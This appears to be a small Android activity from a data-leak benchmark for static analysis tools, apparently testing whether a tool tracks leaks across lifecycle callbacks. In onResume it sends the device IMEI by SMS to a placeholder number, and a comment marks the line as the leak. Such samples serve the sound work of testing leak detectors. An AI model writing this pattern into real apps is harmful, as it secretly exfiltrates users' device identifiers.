package de.ecspride;

import de.ecspride.applicationlifecycle1.R;
import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
	}

	public void onResume() {
        super.onResume();
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("+49 1234", null, ApplicationLifecyle1.imei, null, null); //sink, leak
    }
}
